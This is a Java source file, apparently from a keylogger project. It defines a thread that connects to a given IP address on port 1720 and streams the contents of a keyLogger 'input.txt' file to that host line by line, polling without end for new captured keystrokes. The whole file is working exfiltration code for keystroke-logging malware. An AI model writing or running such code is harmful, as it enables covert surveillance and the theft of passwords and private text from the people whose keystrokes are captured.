package com.company;

//import java.io.IOException;
//import java.io.PrintWriter;
import java.net.Socket;
import java.util.Scanner;
import java.io.*;

public class inputThread extends Thread{
    String ipAddress ;
    public inputThread(String ipAddr){
        ipAddress = ipAddr;
    }
    @Override
    public void run() {

        String host = ipAddress;
        int port = 1720;
        try (Socket socket = new Socket(host, port)) {
            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
            String path = System.getProperty("user.dir");
            System.out.println(path + "\\input.txt");
            path = path + "\\src\\com\\company\\keyLogger\\input.txt";
//            Scanner inp = new Scanner(file);
//            String line = null;
//            while (inp.hasNextLine()) {
//                line = inp.nextLine();
//                out.println(line);
//                out.flush();
//            }
//            System.out.println("done");
//            inp.close();
            BufferedReader br = new BufferedReader(new FileReader(path));
            String line;
            while (true) {
                line = br.readLine();
                if (line != null) {
                    out.println(line);
                } else {
                        try {
                            Thread.sleep(100);   // DELAY could be 100 (ms) for example
                        }catch(InterruptedException e){
                            Thread.currentThread().interrupt();
                        }
                    }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
